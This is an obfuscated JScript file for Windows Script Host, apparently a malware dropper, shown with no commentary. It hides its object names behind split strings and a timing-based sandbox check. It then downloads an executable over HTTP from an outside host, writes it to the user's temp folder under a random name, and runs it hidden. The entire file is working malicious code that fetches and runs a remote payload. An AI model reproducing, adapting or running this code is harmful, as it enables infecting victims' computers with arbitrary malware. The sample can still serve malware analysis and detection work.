var Za = false;
var d = "CreateObject";
var Zc = function ud() {return WScript[d]("WScript.Shell");}(), Hl = 11;
var W = "MSXML2.XMLHTTP";
var MB = 2123213;
var i = 0;
function xd(Vb){Zc["Run"](Vb, i, i);};
function ZM(){return "" + W;};
function SF(rp, p0){i = i * 1; return rp - p0;};
function Q(){return d;};
/*@cc_on
  @if (@_win32 || @_win64)
    Za = true;
  @end
@*/
if (Za)
{
var Ad = "";
function C(){return 22;};
var tN = 0; var HO = 0;
function G()
{
var dJ = new this["Date"]();
var Ce = dJ["getUTCMilliseconds"]();
WScript["Sleep"](C());
var dJ = new this["Date"]();
var H0 = dJ["getUTCMilliseconds"]();
WScript["Sleep"](C());
var dJ = new this["Date"]();
var bl = dJ["getUTCMilliseconds"]();
var tN = "H";
tN = SF(H0, Ce);
var HO = "Pq";
HO = SF(bl, H0);
Ad = "open";
return SF(tN, HO);
}
var yF = false;
var A = false;
for (var FP = i; FP < C() * 1; FP++){if (G() != i){
yF = true; 
HO = "31" + 11 * tN + HO; 
A = true; 
break;
}}
function Of() {return ((yF == true) && (yF == A)) ? 1 : i;};
if (yF && Of() && A){
function eN() {return Zc["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jjulUvxjzYzIYx.exe";};
 W1 = ZM();
 YY = WScript[d](W1);
 var At = 1;
 while (At){
try {
YY[Ad]("GET", "http://www.deco-dessert.com/k3dua", false);
YY["send"]();
W0 = "Sleep";
for (;;){WScript[W0](C() * 11); if (YY["readystate"] >= 2 * 2) break;};
At = i;
} catch(X){};
}
function p(B) {var cK = (1, 2, 3, 4, 5, B); return cK;};
z = WScript[Q()]("ADODB.Stream");
W1 = z;
W1[Ad]();
W1["type"] = p(1);
W1["write"](YY["ResponseBody"]);
z["position"] = p(i);
W1["Save" + "ToFile"](eN(), 2);
z["c"+"lose"]();
OU = eN();
xd(OU);
}
}

